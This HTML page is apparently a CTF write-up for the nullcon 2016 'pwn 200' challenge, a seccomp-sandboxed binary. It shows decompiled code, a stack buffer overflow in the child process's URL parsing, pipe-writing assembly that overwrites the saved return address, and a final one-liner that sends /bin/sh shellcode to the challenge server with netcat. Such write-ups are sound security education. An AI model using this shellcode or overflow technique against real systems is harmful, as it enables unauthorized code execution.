<!DOCTYPE html>
<html>
  <head>
       <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

     <meta name="description" content="i'm korean pwner. :P">
    <link rel="canonical" href="http://naver.com/blog/2016/01/31/2016-nullcon-pwn-200/">

    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="/stylesheets/github-dark.css" media="screen">
    <link rel="stylesheet" type="text/css" href="/stylesheets/syntax.css" media="screen">

  <title>2016 nullcon pwn 200 | pwn_expoit Blog</title>

  </head>

  <body>

    <header>
         <div class="container">
        <h1>pwn_expoit</h1>
        <h2>Pwner is pwning</h2>

        <section id="navigation">
        
          
        
          
        
          
        
          <a href="/blog/archives/index.html">Blog Archives</a>
        
          <a href="/blog/categories/index.html">Categories</a>
        
          
        
          
        
        </section>
    </div>

    </header>

    <div class="container">
      <section id="main_content">
          <div class="post">

  <header class="post-header">
    <h2>2016 nullcon pwn 200</h2>
    <!--<p class="meta">Jan 31, 2016</p> -->
  </header>

  <article class="post-content">
  <p>recently, I challenge nullcon 2016. when hold ctf, i catched pwnable.However, pwn 100 is arm exploit that i can&rsquo;t solve. So i decide to challengepwn 200.<br>
at frist, pwn 200 seem very easy:) . analyzing it, i think that this is sandbox. it was first time for me. <br></p>

<h2>Analysis<br></h2>

<p>this binary conserve with process using pipe. parent process could not exploit because it is sandbox that only use syscall(exit, read, write).
<br></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  if ( read(0, &buf, 4uLL) &gt; 0 )
</span><span class='line'>  {
</span><span class='line'>    v3 = (char *)buf;
</span><span class='line'>    v11 = (char *)mmap(0LL, buf, 7, 34, -1, 0LL);
</span><span class='line'>    if ( !v11 )
</span><span class='line'>      __assert_fail("psc != ((void *)0)", "sandman.c", 0xCAu, "main");
</span><span class='line'>    v13 = 0;
</span><span class='line'>    while ( buf )
</span><span class='line'>    {
</span><span class='line'>      v3 = &v11[v13];
</span><span class='line'>      v12 = read(0, v3, buf);
</span><span class='line'>      if ( v12 &lt; 0 )
</span><span class='line'>        break;
</span><span class='line'>      v13 += v12;
</span><span class='line'>      buf -= v12;
</span><span class='line'>    }
</span><span class='line'>    if ( !buf )
</span><span class='line'>    {
</span><span class='line'>      LODWORD(v4) = seccomp_init(0LL, v3);
</span><span class='line'>      v10 = v4;
</span><span class='line'>      if ( v4 )
</span><span class='line'>      {
</span><span class='line'>        v12 = seccomp_rule_add(v10, 2147418112LL, 0LL, 0LL);
</span><span class='line'>        if ( v12 &gt;= 0 )
</span><span class='line'>        {
</span><span class='line'>          v12 = seccomp_rule_add(v10, 2147418112LL, 1LL, 0LL);
</span><span class='line'>          if ( v12 &gt;= 0 )
</span><span class='line'>          {
</span><span class='line'>            v12 = seccomp_rule_add(v10, 2147418112LL, 60LL, 0LL);
</span><span class='line'>            if ( v12 &gt;= 0 )
</span><span class='line'>            {
</span><span class='line'>              v12 = seccomp_rule_add(v10, 2147418112LL, 231LL, 0LL);
</span><span class='line'>              if ( v12 &gt;= 0 )
</span><span class='line'>              {
</span><span class='line'>                v5 = v10;
</span><span class='line'>                v12 = seccomp_load(v10);
</span><span class='line'>                if ( v12 &gt;= 0 )
</span><span class='line'>                {
</span><span class='line'>                  v9 = v11;
</span><span class='line'>                  ((void (__fastcall *)(__int64, signed __int64))v11)(v5, 2147418112LL);
</span><span class='line'>                }
</span><span class='line'>              }
</span><span class='line'>            }
</span><span class='line'>          }
</span><span class='line'>        }
</span><span class='line'>      }
</span><span class='line'>    }
</span><span class='line'>  }
</span></code></pre></td></tr></table></div></figure>


<p><br>
parent process call custom function at final. in order to exploit, use to non sandbox(child process) So, i create assembly code to pipe write.
<br>
and then, i analyze child function. there are some inputs in child function.<br></p>

<h3>inputs in child function</h3>

<p>1st input: most input 0x0e<br>
2nd input: buffer size limited 0x1000<br>
3rd input: buffer had to start &ldquo;<a href="http://">http://</a>&rdquo; <----- heap buffer
<br>
<br></p>

<h2>Vulnerable</h2>

<p>after input, heap buffer(3rd input) is copied dest buffer(rbp-0x220).yet, heap buffer is possible 0x1000. it overwrite rip !!!! :)<br></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int __fastcall sub_400BAC(__int64 a1)
</span><span class='line'>{
</span><span class='line'>  int result; // eax@1
</span><span class='line'>  char *v2; // rax@4
</span><span class='line'>  char *v3; // rax@6
</span><span class='line'>  size_t v4; // rax@9
</span><span class='line'>  char dest; // [sp+10h] [bp-220h]@9
</span><span class='line'>  size_t v6; // [sp+210h] [bp-20h]@2
</span><span class='line'>  char *nptr; // [sp+218h] [bp-18h]@2
</span><span class='line'>  char *v8; // [sp+220h] [bp-10h]@1
</span><span class='line'>  unsigned __int16 v9; // [sp+22Eh] [bp-2h]@1
</span><span class='line'>
</span><span class='line'>  v9 = 80;
</span><span class='line'>  v8 = (char *)&unk_401194;
</span><span class='line'>  result = strncmp((const char *)a1, "http://", 7uLL);
</span><span class='line'>  if ( !result )
</span><span class='line'>  {
</span><span class='line'>    nptr = (char *)(a1 + 7);
</span><span class='line'>    v6 = a1 + strlen((const char *)a1);
</span><span class='line'>    while ( (unsigned __int64)nptr &gt; v6 )
</span><span class='line'>    {
</span><span class='line'>      if ( *nptr == 0x3A )
</span><span class='line'>      {
</span><span class='line'>        v2 = nptr++;
</span><span class='line'>        *v2 = 0;
</span><span class='line'>        v9 = atoi(nptr);
</span><span class='line'>      }
</span><span class='line'>      else if ( *nptr == 0x2F )
</span><span class='line'>      {
</span><span class='line'>        v3 = nptr++;
</span><span class='line'>        *v3 = 0;
</span><span class='line'>        v8 = nptr;
</span><span class='line'>        break;
</span><span class='line'>      }
</span><span class='line'>      ++nptr;
</span><span class='line'>    }
</span><span class='line'>    nptr = (char *)(a1 + 7);
</span><span class='line'>    v4 = strlen((const char *)(a1 + 7));
</span><span class='line'>    strncpy(&dest, (const char *)(a1 + 7), v4);
</span><span class='line'>    result = sub_400B97((__int64)&dest, v9);
</span><span class='line'>  }
</span><span class='line'>  return result;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p><br>
However, finding shellcode address is very hard. on this account, i faild to solve pwn 200 during nullcon ctf<br></p>

<p>after finish ctf, i noticed that fork process share same address.<br>
<a href="http://stackoverflow.com/questions/5365580/fork-same-memory-addresses">http://stackoverflow.com/questions/5365580/fork-same-memory-addresses</a><br>
i saved stack. then stack overwrite rip :P.
<br></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%define FD 4
</span><span class='line'>section .text
</span><span class='line'>global _start
</span><span class='line'>_start:
</span><span class='line'>  lea r9, [rsp-0x100] &lt;------ save stack
</span><span class='line'>        mov qword rsi,0x602070 
</span><span class='line'>        mov edi, 1
</span><span class='line'>        mov qword rax, 1
</span><span class='line'>        mov qword rdx, 8
</span><span class='line'>        syscall
</span><span class='line'>  
</span><span class='line'>  mov qword rsi, 0x602068
</span><span class='line'>  mov edi, 1
</span><span class='line'>  mov qword rax, 1
</span><span class='line'>  mov qword rdx, 8
</span><span class='line'>  syscall
</span><span class='line'>
</span><span class='line'>        mov rax, 1                                                                                                    
</span><span class='line'>        mov edi, 1                                                                                                    
</span><span class='line'>        mov qword rsi,0x4011f4                                                                                        
</span><span class='line'>        mov rdx, 4                                                                                                    
</span><span class='line'>        syscall                                                                                                       
</span><span class='line'>                                                                                                                      
</span><span class='line'>        xor rax, rax                                                                                                  
</span><span class='line'>        xor edi, edi                                                                                                  
</span><span class='line'>        mov qword rdx, 4                                                                                              
</span><span class='line'>        mov qword rsi, 0x602008                                                                                       
</span><span class='line'>        syscall                                                                                                       
</span><span class='line'>                                                                                                                      
</span><span class='line'>        mov qword rax, 1                                                                                              
</span><span class='line'>        mov edi, FD                                                                                                   
</span><span class='line'>        mov qword rsi, 0x602008                                                                                       
</span><span class='line'>        mov qword rdx, 4                                                                                              
</span><span class='line'>        syscall
</span><span class='line'>  
</span><span class='line'>  sub rsp, 0x600
</span><span class='line'>  mov rax, 0
</span><span class='line'>  mov edi, 0
</span><span class='line'>  mov rsi, rsp
</span><span class='line'>  mov rdx, 0x500
</span><span class='line'>  syscall
</span><span class='line'>  mov qword [rsp+0x234], r9 &lt;-------- overwrite rip
</span><span class='line'>  mov qword rax, 1                                                                                              
</span><span class='line'>        mov edi, FD                                                                                                   
</span><span class='line'>        mov qword rsi, rsp                                                                                            
</span><span class='line'>        mov qword rdx, 0x500                                                                                          
</span><span class='line'>        syscall                                                                                                       
</span><span class='line'>        add rsp, 0x600                                                                                                
</span><span class='line'>                                                                                                                      
</span><span class='line'>        xor rax, rax                                                                                                  
</span><span class='line'>        xor edi, edi                                                                                                  
</span><span class='line'>        mov qword rsi, 0x6020b8                                                                                       
</span><span class='line'>        mov rdx, 119                                                                                                  
</span><span class='line'>        syscall                                                                                                       
</span><span class='line'>                                                                                                                      
</span><span class='line'>        mov qword rax, 1                                                                                              
</span><span class='line'>        mov edi, 1                                                                                                    
</span><span class='line'>        mov qword rsi, 0x6020B8                                                                                       
</span><span class='line'>        mov qword rdx, 119                                                                                            
</span><span class='line'>        syscall
</span></code></pre></td></tr></table></div></figure>


<p><br></p>

<h2>exploit</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'print ("\x0e")'; python -c 'print (open("shell.bin").read()+"A"*2360)'; python -c 'print ("\x0e"+"\x60\x02\x00\x00"+"http://"+"\x90"*(0x220-
</span><span class='line'>49)+"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"+"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"+"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"+"\x58\x0f\x05"+"C"*8+"\x6c\x11\x40"+"\x00"*5)';cat)|nc 52.72.171.221 9982</span></code></pre></td></tr></table></div></figure>


  </article>

  <footer>
     <hr>
     <p class="meta">Jan 31, 2016</p>
   </footer>

</div>

      </section>
    </div>

  </body>
</html>
